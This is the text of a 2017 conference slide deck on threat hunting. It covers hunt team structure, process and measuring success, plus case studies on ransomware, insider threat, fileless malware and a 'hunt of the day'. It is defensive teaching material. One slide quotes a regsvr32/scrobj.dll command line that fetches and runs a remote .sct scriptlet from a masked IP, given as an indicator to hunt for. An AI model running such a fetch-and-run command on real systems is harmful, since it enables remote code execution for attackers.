PUBLIC
THREAT HUNTING, 
THE NEW WAY
HITCON PACIFIC 2017
In Ming, Wei Chea
PUBLIC
INTRO
1
In Ming  
(胤铭)
Loves 
MMA
Wei Chea
(伟杰)
Loves diving 
& my dog
½ Taiwanese
PUBLIC
We are not involved in ALL the information we are sharing today.
Many of the information (use cases, tools) we going to discuss are made 
possible by a group of very dedicated people in Countercept and the 
security community.
2
DISCLAIMER
PUBLIC
• What is threat hunting?
• People, Process, Technology
• Case Study
• How to start threat hunting
• Q & A
3
AGENDA
PUBLIC
WHAT IS THREAT 
HUNTING?
PUBLIC
5
“THREAT HUNTING”
•
IP, Domain or  Hash 
Search
•
Hunting on the 
darknet or Internet
•
Endpoint Detection & 
Response (EDR) = 
Threat Hunting!?
•
Automated Threat Hunting!?
PUBLIC
First discussed in mid 2000s 
by NSA/US Airforce. 
Definition of hunting in 
The US Army LandCyber White 
Paper released in 2013
THREAT HUNTING
6
“cyber hunt teams will work inside 
the Army enterprise to actively 
search for and locate threats that 
have penetrated the Army 
enterprise, but not yet manifested 
their intended effects.”
“Counter-reconnaissance, or hunt forces, will 
work within Army networks to maneuver, secure, 
and defend key cyberspace terrain, identifying 
and defeating concealed cyber adversaries that 
have bypassed the primary avenues of approach 
monitored by automated systems”.
http://dtic.mil/dtic/tr/fulltext/u2/a592724.pdf
PUBLIC
7
THREAT HUNTING (威胁猎捕)
•
“work inside the Army enterprise to actively search” (专注内部主动搜索)
•
“locate threats that have penetrated the Army enterprise” (侦测已经侵入
的威胁)
•
“bypassed the primary avenues of approach monitored by automated 
systems” (逃避自动式的侦测系统)
PUBLIC
PEOPLE, PROCESS, 
TECHNOLOGY.. AGAIN?!
PUBLIC
•
Assume breach mind-set
•
Go beyond the technology
•
Offensive or/and Defensive knowledge 
(Incident Response, Penetration 
Tester, SOC, Sys Admin etc)
9
PEOPLE
•
Not reserved for Level 3 or the ‘best’
•
Research / Innovation Time
–
Use Case / Hypothesis Generation
•
Threat Hunting 101 – Become The 
Hunter
PUBLIC
•
Senior Management (CIO/CISO)
•
Data Protection Office, Governance, Legal
•
The other security teams (SOC, Incident Response)
10
PEOPLE
PUBLIC
•
Existing Processes (SIM, Data Privacy, Data Logging, 
Incident Response etc) 
•
Obtaining new log sources
•
Use Case Generation
•
Hunt Investigation 
•
Measuring Success
11
PROCESS
PUBLIC
Multiple reflective dll injections
12
PROCESS – HUNT INVESTIGATION
PUBLIC
•
What Investigation rights for your threat hunters?
•
Do they escalate to IR for further investigation?
•
Can your IR start investigation without a confirmed incident?
•
Will this overload your IR?
13
PROCESS – HUNT INVESTIGATION
•
Recommendation:
 Provide certain investigation capability to your hunt 
team
 Hash check, process dump, memory dump or file capture
 Part of your internal team
PUBLIC
14
PROCESS
PUBLIC
VERY IMPORTANT! 
•
Don’t measure by the # of threats found…
•
What factors to measure success? 
 Mean Time to Detect
 Find Suspicious -> Confirmed it 
is malicious 
 Severity of the findings
•
Repeated findings & false positive
15
PROCESS – MEASURING SUCCESS
PUBLIC
•
Least Important… for the start
•
Understand what data are available (Endpoint, Network, Application) 
•
Configuration Management, Continuous Delivery
 Chef, Puppet
 Use Case Development
 AUTOMATION!
•
Technology Stack
 Endpoint (GRR, Sysmon, Windows 
Event Logs, osquery, Mozilla InvestiGator)
 Network (BRO, Suricata)
 Data Store (ELK, Splunk)
16
TECHNOLOGY
PUBLIC
17
HOW WE ARE DOING IT
Network IDS
Network Traffic Analysis
Event Log Correlation
Alerting
Memory Analysis
Persistence
Process Monitoring
Offline Monitoring
File Analysis
Forensic Artefacts
Dynamic Tool Update
Endpoint
Log Analysis
Network 
Traffic Analysis
Threat Hunting
THE PARIS MODEL
PUBLIC
People
Technology
Process
THE PARIS MODEL
AUTOMATED 
NOTIFICATION
‘HUNTING USE CASE’ 
GENERATION  (HYPOTHESIS)
1
2
3
4
Confidence
10%
40%
80%
99%
Tactical Threat intel
Capability
Use Case 
Execution
Automation
PUBLIC
CASE STUDY 1
PUBLIC
21
CASE STUDY 1:
ENTERPRISE RANSOMWARE
PUBLIC
22
CASE STUDY 1:
ENTERPRISE RANSOMWARE
Background
•
Global Company
•
Approx. USD$ 133 million turnover last year
PUBLIC
CASE STUDY 1:
ENTERPRISE RANSOMWARE
23
Delivery 
Exploitation
C2
Priv. 
Escalation
Lateral 
Movement
Objective
First 
Delivery
Second
Delivery
Lateral 
Movement
More Lateral
Movement
‘Ransomware’ 
deployed
PUBLIC
CASE STUDY 1:
ENTERPRISE RANSOMWARE
24
PUBLIC
CASE STUDY 1:
ENTERPRISE RANSOMWARE
25
Delivery 
Exploitation
C2
Priv. 
Escalation
Lateral 
Movement
Objective
First 
Delivery
Second
Delivery
Lateral 
Movement
More Lateral
Movement
‘Ransomware’ 
deployed
PUBLIC
26
CASE STUDY 1:
ENTERPRISE RANSOMWARE
PUBLIC
27
CASE STUDY 1:
ENTERPRISE RANSOMWARE
PUBLIC
Delivery 
Exploitation
C2
Priv. 
Escalation
Lateral 
Movement
Objective
First 
Delivery
Second
Delivery
Lateral 
Movement
More Lateral
Movement
‘Ransomware’ 
deployed
CASE STUDY 1:
ENTERPRISE RANSOMWARE
28
PUBLIC
29
CASE STUDY 1:
ENTERPRISE RANSOMWARE
PUBLIC
30
CASE STUDY 1:
ENTERPRISE RANSOMWARE
PUBLIC
So what do we do???
•
Agents needs to be deployed FAST!!!!
•
Start monitor:
 Process memory
 Registry
 Process Execution
 Autoruns and Scheduled Tasks
 Etc…
But is this enough???
•
I don’t think so
So what do you do then?
CASE STUDY 1:
ENTERPRISE RANSOMWARE
31
PUBLIC
32
CASE STUDY 1:
ENTERPRISE RANSOMWARE
CASE STUDY 1:ENTERPRISE RANSOMWARE
People
Technology
Process
AUTOMATED NOTIFICATION
‘HUNTING USE CASE’ 
GENERATION  (HYPOTHESIS)
1
2
3
4
Confidence
10%
40%
80%
99%
Tactical Threat intel
Capability
Use Case 
Execution
Automation
PUBLIC
CASE STUDY 2
PUBLIC
35
CASE STUDY 2:
INSIDER THREAT
http://www.verizonenterprise.com/resources/reports/
rp_DBIR_2017_Report_en_xg.pdf
PUBLIC
36
CASE STUDY 2:
INSIDER THREAT
Background
•
Global Company
•
Approx. USD$ 799 million turnover last year
•
Approx. 70,000 endpoints
PUBLIC
37
CASE STUDY 2:
INSIDER THREAT
“%userprofile%\appdata\roaming\Microsoft\windows\start 
menu\programs\startup\i tunes.exe
“%programdata%\Microsoft\windows\start menu\
programs\startup\bstack.exe”
PUBLIC
38
CASE STUDY 2:
INSIDER THREAT
“%userprofile%\appdata\roaming\Microsoft\windows\start 
menu\programs\startup\i tunes.exe”
Why am I suspicious?
•
Supposed to be “itunes.exe”
•
Is “itunes.exe” in user startup folder usually?
•
Host count is really low for such a popular program.
•
And never seen by VT before!!!
PUBLIC
39
CASE STUDY 2:
INSIDER THREAT
Why am I suspicious?
•
Do I know you publicly “bstack.exe”? (Likely not because of VT)
•
Are you some custom program?
•
But why your host count is so freaking low? 2 in 70,000!!!
“%programdata%\Microsoft\windows\start menu\
programs\startup\bstack.exe”
PUBLIC
40
CASE STUDY 2:
INSIDER THREAT
“%userprofile%\appdata\roaming\Microsoft\windows\start 
menu\programs\startup\i tunes.exe
“%programdata%\Microsoft\windows\start menu\
programs\startup\bstack.exe”
PUBLIC
41
CASE STUDY 2:
INSIDER THREAT
People
Technology
Process
AUTOMATED NOTIFICATION
‘HUNTING USE CASE’ 
GENERATION  (HYPOTHESIS)
1
2
3
4
Confidence
10%
40%
80%
99%
Tactical Threat intel
Capability
CASE STUDY 2:
INSIDER THREAT
Use Case 
Execution
Automation
PUBLIC
CASE STUDY 3
PUBLIC
44
CASE STUDY 3:
FILELESS MALWARE
PUBLIC
What is fileless malware/in-memory attack?
•
Resides in RAM
•
Inject into: Running processes or suspended processes, 
(Usually well known)
Few ways to be “invisible”:
•
IAT/EAT hooking
•
Inline hooking
•
Reflective load
•
APC injection
•
Process hollowing
How are you AV?
CASE STUDY 3:
FILELESS MALWARE
45
PUBLIC
In-Memory Attack
46
CASE STUDY 3:
FILELESS MALWARE
•
Securi-Tay 2017 - Advanced Attack Detection
•
Taking Hunting to the Next Level: Hunting in Memory - SANS Threat 
Hunting Summit 2017
Suspicious Threads
PUBLIC
CASE STUDY 3:
FILELESS MALWARE
47
https://lyndseyreneephotography.files.wordpress.com/2011/05/img_5916editname.jpg
http://cdn.newsapi.com.au/image/v1/1f5388a9571cf7f7022158aee1726ced
CASE STUDY 3:FILELESS MALWARE
People
Technology
Process
AUTOMATED NOTIFICATION
‘HUNTING USE CASE’ 
GENERATION  (HYPOTHESIS)
1
2
3
4
Confidence
10%
40%
80%
99%
Tactical Threat intel
Capability
Use Case 
Execution
Automation
PUBLIC
CASE STUDY 4
PUBLIC
50
CASE STUDY 4:
HUNT OF THE DAY
What is HOTD?
•
Important aspect of threat hunting
•
Latest findings 
•
Agents go work now!
Why HOTD?
•
Detect and respond to threat (Unknown to you)
PUBLIC
51
CASE STUDY 4:
HUNT OF THE DAY
PUBLIC
regsvr32.exe /s /n /u /i:”C:\xxxxxxxxx” scrobj.dll
regsvr32.exe /s /n /u /i:http://xxx.xxx.xxx.xxx/hello.sct scrobj.dll
52
CASE STUDY 4:
HUNT OF THE DAY
People
Technology
Process
AUTOMATED NOTIFICATION
‘HUNTING USE CASE’ 
GENERATION  (HYPOTHESIS)
1
2
3
4
Confidence
10%
40%
80%
99%
Tactical Threat intel
Capability
CASE STUDY 4:
HUNT OF THE DAY
Use Case 
Execution
Automation
PUBLIC
GETTING 
STARTED
PUBLIC
55
HOW TO START
•
Start small, Dream big
•
Work with what you have
– People (Hunt Sprint)
– Process
– Technology
•
Go for the low hanging fruit first..
•
Getting the budget -> DBIR/Equifax
•
MITRE ATT&CK™
PUBLIC
• Threat Hunting should be part of your detection strategy
• Anyone can start threat hunting
• Establish the PEOPLE, PROCESS then technology
CONCLUSION
56
PUBLIC
57
REFERENCE
Threat Hunting 101 – Become The Hunter
https://youtu.be/vmVE2PCVwHU
Securi-Tay 2017 - Advanced Attack Detection
https://youtu.be/ihElrBBJQo8
Taking Hunting to the Next Level: Hunting in Memory - SANS Threat 
Hunting Summit 2017
https://youtu.be/EVBCoV8lpWc
Github: Python Exe Unpacker
https://github.com/countercept/python-exe-unpacker
QUESTIONS?
问题? 
@countercept
In Ming (PI:EMAIL)
Wj (PI:EMAIL)